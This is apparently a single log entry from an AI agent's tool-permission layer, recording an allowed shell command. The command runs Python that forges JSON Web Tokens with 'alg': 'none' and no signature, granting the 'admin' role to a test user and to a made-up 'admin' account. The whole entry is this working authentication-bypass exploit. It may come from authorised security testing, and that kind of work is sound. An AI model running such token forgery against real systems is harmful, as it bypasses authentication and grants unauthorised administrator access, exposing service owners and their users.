{"ts": 1790684095.3866012, "decision_id": "3eefc5c949c4", "tool": "run_shell", "allow": true, "reason": null, "target": "cd /work && python3 -c \"\nimport jwt\nimport base64\nimport json\n\n# Create a token with alg=none\nheader = {'alg': 'none', 'typ': 'JWT'}\npayload = {'user_id': 'd8083077-d088-4bfe-b147-0ad561de59c2', 'username': 'testuserA', 'role': 'admin', 'exp': 1790677884}\n\n# Encode header and payload\nheader_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).decode().rstrip('=')\npayload_b64 = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode()).decode().rstrip('=')\n\n# For alg=none, signature is empty\ntoken = f'{header_b64}.{payload_b64}.'\nprint('Forged alg=none token:')\nprint(token)\nprint()\n\n# Also try with a fresh user_id to see if it creates a new admin\npayload2 = {'user_id': '00000000-0000-0000-0000-000000000000', 'username': 'admin', 'role': 'admin', 'exp': 1790677884}\npayload2_b64 = base64.urlsafe_b64encode(json.dumps(payload2, separators=(',', ':')).encode()).decode().rstrip('=')\ntoken2 = f'{header_b64}.{payload2_b64}.'\nprint('Forged alg=none token (new admin):')\nprint(token2)\n\""}
